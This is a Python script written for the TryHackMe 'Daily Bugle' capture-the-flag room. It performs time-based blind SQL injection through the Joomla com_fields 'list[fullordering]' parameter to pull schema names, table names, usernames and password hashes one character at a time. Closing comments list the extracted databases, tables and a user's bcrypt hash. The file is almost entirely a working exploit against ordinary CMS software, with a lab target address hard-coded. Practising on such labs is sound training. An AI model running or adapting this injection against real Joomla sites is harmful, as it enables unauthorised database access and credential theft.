# -*-coding:utf8-*-

### This code is for the TryHackMe DailyBugle room.
import requests
import string
from datetime import datetime

IP='10.10.58.18'


# For each row
for row in range(0,200):
    result = '$2y$10$'
    somethingChanged = False
    charpos = 8
    # Get the value
    while True:
        for i in '$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/.#-_':
            print('testing with {0} {1}'.format(result,i))
            ## Get all db names
            #payload = "(SELECT IF(SUBSTRING(SCHEMA_NAME,{0},1) = CHAR({1}), SLEEP(3),null) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET {2})".format(charpos,ord(i), row)
            ## Get all table_names for a db given
            #payload = "(SELECT IF(SUBSTRING(TABLE_NAME,{0},1) = CHAR({1}), SLEEP(5),null) FROM (SELECT distinct TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE (SUBSTRING(TABLE_SCHEMA,1,1) = CHAR(74)) and (SUBSTRING(TABLE_SCHEMA,2,1) = CHAR(79)))T_NAME LIMIT 1 OFFSET {2})".format(charpos,ord(i), row)
            ## Get all usernames for a db and a table given
            #payload = "(SELECT IF(SUBSTRING(username,{0},1) = CHAR({1}), SLEEP(5),null) FROM joomla.fb9j5_users LIMIT 1 OFFSET {2})".format(charpos,ord(i), row)
            ## Get all passwords for a db and a table given
            payload = "(SELECT IF(SUBSTRING(password,{0},1) = CHAR({1}), SLEEP(5),null) FROM joomla.fb9j5_users LIMIT 1 OFFSET {2})".format(charpos,ord(i), row)
            currentdate = datetime.now()
            req =  requests.get('http://{0}/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]={1}'.format(IP, payload)) 
            nextdate = datetime.now()
            #print(req.url)
            
            timed = nextdate-currentdate

        
            if timed.seconds > 4:
                print("Got: {0} {1}".format(result,i))
                result += i
                charpos += 1
                somethingChanged = True
                break
      
        if not(somethingChanged):    
            print(">> Next")
            break
        
        somethingChanged = False
    

print(result)

####### RESULTS FOR DAILY BUGLE ROOM IN TRYHACKME
## ALL DB_NAMES:
# INFORMATION_SCHEMA
# JOOMLA
# MYSQL
# PERFORMANCE_SCHEMA

##### https://docs.joomla.org/Tables/users
## ALL TABLE_NAMES for JO% :
# fb9j5_assets
# fb9j5_associations
# fb9j5_ba
# ...
# fb9j5_users

## ALL USERNAMES and passwords
# jonah:$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
